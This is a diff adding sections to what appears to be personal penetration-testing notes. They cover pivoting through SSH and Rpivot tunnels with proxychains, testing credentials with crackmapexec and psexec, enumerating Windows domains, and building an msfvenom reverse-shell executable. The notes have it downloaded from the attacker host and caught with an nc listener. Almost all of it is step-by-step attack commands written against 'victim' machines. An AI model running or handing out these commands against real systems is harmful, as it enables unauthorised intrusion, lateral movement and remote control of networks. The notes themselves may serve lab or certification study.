@@ -95,3 +95,205 @@ sqlite3 places.sqlite
 > .tables
 > SELECT * FROM moz_bookmarks;
 ```
+
+
+
+## Pivoting&#x20;
+
+### SSH
+
+Once we have access to a machine with SSH credential we can create a tunnel to connect our machine to other networks.
+
+Establish the tunnel on a local port
+
+```bash
+sudo apt install proxychains
+
+ssh -D $LOCAL_PORT $USER@$VICTIM1_IP
+# ex ssh -D 8090 mario@192.168.3.2
+```
+
+Once we have the tunnel established, we have modify our proxy file and add this port.
+
+```bash
+nano /etc/proxychains.conf
+
+# add follow line in the bottom
+socks5 127.0.0.1 8090
+socks4 127.0.0.1 8090
+```
+
+Now using `proxychains` we can access to all port of all other network machines.
+
+```bash
+# this command to create a port fordward which allow us to see a web page
+proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2
+
+# use nmap through the pivoting
+proxychains nmap -sT $VICTIM2_IP
+
+# this command allow us to access via RDP to other machine in other network
+proxychains rdesktop $VICTIM2_IP
+```
+
+
+
+### Rpivot
+
+
+
+_RPIVOT allows to tunnel traffic into internal network via socks 4. It works like ssh dynamic port forwarding but in the opposite direction. Target machine as client and attack machine as server._
+
+This tool is usefull when we have access to a machine through web rev shell but **we do not have the credentials** to make a SSH tunneling.
+
+{% embed url="https://github.com/klsecservices/rpivot" %}
+
+```bash
+git clone https://github.com/klsecservices/rpivot
+```
+
+This tool works with Python2, to running it we can create a virtual env with conda
+
+{% code overflow="wrap" %}
+```bash
+cd rpivot
+conda create -n rpivot python=2.7
+
+# Start the server on attacker machine
+python2 server.py --server-port $SERVER_PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port $PROXY_PORT # (ex SERVER_PORT = 9980 and PROXY_PORT 9050)
+# server_port = expose port from receiving client connection
+# proxy_port = port which will be use by proxychains
+```
+{% endcode %}
+
+Now we have to transfer the rpivot .zip directory to target machine
+
+```bash
+# attack machine in the dir where there is rpivot.zip
+python3 -m http.server 80
+
+# target machine
+wget http://$ATT_IP/rpivot.zip
+```
+
+Check if in the target machine there is python2 installed and run the connection to the server.
+
+```bash
+# target machine
+python --version # check python version
+
+# conect to the rpivot server
+python client.py --server-ip $ATT_IP --server-port $SERVER_PORT
+```
+
+When the connection has been initialized, we have to add this configuration to proxychain conf file.
+
+```bash
+nano /etc/proxychains.conf
+
+# add follow line in the bottom and COMMENT the socks5 if there is it
+socks4 127.0.0.1 $PROXY_PORT
+```
+
+Now using `proxychains` we can access to all port of all other network machines.
+
+```bash
+# this command to create a port fordward which allow us to see a web page
+proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2
+
+# use nmap through the pivoting
+proxychains nmap -sT $VICTIM2_IP
+
+# this command allow us to access via RDP to other machine in other network
+proxychains rdesktop $VICTIM2_IP
+```
+
+
+
+## Internal Access
+
+<figure><img src="../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>
+
+### Credentials logon trying
+
+We can use the credentials found to try the access to Windows machine discovered.
+
+```bash
+proxychains crackmapexec smb $TARGET_IP -u $USER -p $PASS
+```
+
+
+
+### PsExec trying
+
+With the validated credentials we can try to establish a connection with `impacket-psexec`
+
+```bash
+proxychains impacket-psexec '$DOMAIN/$USER:$PASS@$TARGET_IP'
+```
+
+
+
+### Get Information from the target
+
+If we are in a windows env we can see in what domain is the machine with this command
+
+```powershell
+net user /dom
+```
+
+and view if there are another DC.
+
+<figure><img src="../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>
+
+Try to ping that and we have just discover another machine.
+
+Check the domain groups
+
+```powershell
+net group /dom
+```
+
+
+
+### Create MSFvenom payload to stable shell
+
+To upgrade the shell we can craft a msfvenom payload and execute it in the target machine.
+
+{% code overflow="wrap" %}
+```bash
+msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=$ATT_IP LPORT=$PORT -f exe -o rev.exe
+```
+{% endcode %}
+
+Transfer the file to target machine
+
+```bash
+# target machine
+iwr http://$ATT_IP/rev.exe -OutFile C:\Tmp\rev.exe
+```
+
+Set a listener and then run the executable
+
+```bash
+# attacker machine
+nc -nvlp $PORT
+
+# target machine
+cd C:\Tmp
+.\rev.exe
+```
+
+Now we have a stable shell
+
+
+
+### Get domain user information
+
+```powershell
+# users list
+net user /dom
+
+# user info
+net user $USER /dom
+```
